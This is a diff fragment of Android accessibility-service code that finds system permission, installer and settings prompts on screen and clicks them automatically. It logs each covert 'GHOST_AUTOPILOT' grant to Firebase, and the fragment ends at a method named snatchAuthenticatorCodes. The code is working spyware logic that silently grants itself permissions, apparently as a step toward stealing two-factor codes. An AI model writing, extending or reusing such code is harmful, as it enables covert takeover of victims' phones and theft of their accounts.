+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return;
+
+                boolean clicked = false;
+                for (String target : targets) {
+                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
+                    if (nodes != null && !nodes.isEmpty()) {
+                        for (AccessibilityNodeInfo node : nodes) {
+                            if (node != null && node.isVisibleToUser()) {
+                                // Double check package to ensure we are only clicking system prompts
+                                String nodePkg = node.getPackageName() != null ? node.getPackageName().toString() : "";
+                                if (nodePkg.contains("permissioncontroller") || nodePkg.contains("packageinstaller") || nodePkg.contains("settings")) {
+                                    
+                                    AccessibilityNodeInfo clickable = node;
+                                    while (clickable != null && !clickable.isClickable()) {
+                                        clickable = clickable.getParent();
+                                    }
+
+                                    if (clickable != null && clickable.isClickable()) {
+                                        clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                    } else {
+                                        Rect bounds = new Rect();
+                                        node.getBoundsInScreen(bounds);
+                                        clickAt(bounds.centerX(), bounds.centerY());
+                                    }
+                                    
+                                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Automatically granted system permission [" + target + "]");
+                                    clicked = true;
+                                    break;
+                                }
                             }
-                            FirebaseConfig.logActivity("COVERT_UPLINK: Auto-Pilot clicked [" + target + "]");
-                            root.recycle();
-                            return; 
                         }
                     }
+                    if (clicked) break;
                 }
-            }
-            root.recycle();
-        }
-
-        // --- DEEP MENU AUTOMATION (Settings Traversal) ---
-        if (pkg.contains("settings")) {
-            clickByText("Lab-STAR");
-            String[] switchKeywords = {"OFF", "DISENGAGED", "DISABLED", "ENABLE", "USE LAB-STAR", "NOT ALLOWED"};
-            for (String kw : switchKeywords) {
-                if (clickByText(kw)) return;
-            }
-        }
+                root.recycle();
+            } catch (Exception ignored) {}
+        }, 150); // Reduced delay for faster interception
     }
 
     private void snatchAuthenticatorCodes(String pkg) {
